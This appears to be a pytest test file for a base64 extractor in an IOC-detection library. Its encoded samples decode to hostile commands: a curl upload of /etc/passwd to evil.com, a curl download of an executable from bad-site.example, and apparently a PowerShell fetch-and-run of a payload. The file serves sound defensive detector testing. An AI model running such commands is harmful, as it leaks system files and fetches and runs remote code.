# Copyright (c) 2026 MalX Labs and contributors
# SPDX-License-Identifier: MPL-2.0

import pytest
from iocx.detectors.extractors.base64 import extract

# ------------------------------------------------------------
# POSITIVE CASES
# ------------------------------------------------------------

@pytest.mark.parametrize("text, expected", [

    # Basic decoding (decoded: hello world)
    (
        "aGVsbG8gd29ybGQ=",
        ["aGVsbG8gd29ybGQ="]
    ),

    # URL command string (decoded: https://evil.com/payload.php curl -F /etc/passwd)
    (
        "aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk",
        ["aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnBocCBjdXJsIC1GIC9ldGMvcGFzc3dk"]
    ),

    # JSON with multiple IOCs (decoded: {\"url\": \"http://malicious.site/download\", \"domain\": \"malicious.site\", \"ip\": \"192.168.0.1\"})
    (
        "eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9",
        ["eyJ1cmwiOiAiaHR0cDovL21hbGljaW91cy5zaXRlL2Rvd25sb2FkIiwgImRvbWFpbiI6ICJtYWxpY2lvdXMuc2l0ZSIsICJpcCI6ICIxOTIuMTY4LjAuMSJ9"]
    ),

    # Nested base64 (no recursion) (decoded: aGVsbG8gd2lkaW5lci5saW5rb3Rpbmc=)
    (
        "YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0=",
        ["YUdWc2JHOGdkMmxrYVc1bGNpNXNhVzVyYjNScGJtYz0="]
    ),

    # Long multiline payload (decoded: Server: http://bad-site.example/download?123456\nPayload: /tmp/file.exe\nCommand: curl -O file.exe http://bad-site.example/file.exe)
    (
        "U2VydmVyOiBodHRwOi8vYmFkLXNpdGUuZXhhbXBsZS9kb3dubG9hZD8xMjM0NTYKUGF5bG9hZDogL3RtcC9maWxlLmV4ZQpDb21tYW5kOiBjdXJsIC1PIGZpbGUuZXhlIGh0dHA6Ly9iYWQtc2l0ZS5leGFtcGxlL2ZpbGUuZXhl",
        ["U2VydmVyOiBodHRwOi8vYmFkLXNpdGUuZXhhbXBsZS9kb3dubG9hZD8xMjM0NTYKUGF5bG9hZDogL3RtcC9maWxlLmV4ZQpDb21tYW5kOiBjdXJsIC1PIGZpbGUuZXhlIGh0dHA6Ly9iYWQtc2l0ZS5leGFtcGxlL2ZpbGUuZXhl"]
    ),
])
def test_base64_positive(text, expected):
    out = extract(text)
    assert [d.value for d in out] == expected


@pytest.mark.parametrize("text", [

    # Too short (<12 chars)
    "aGVsbG8= IHdvcmxk",

    # Invalid base64
    "notbase64@@@",

    # UTF‑16LE with control characters → rejected
    "JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACIAOwAgAGkAZQB4ACAAJAB1AHIAbAA=",
])
def test_base64_negative(text):
    out = extract(text)
    assert [d.value for d in out] == []
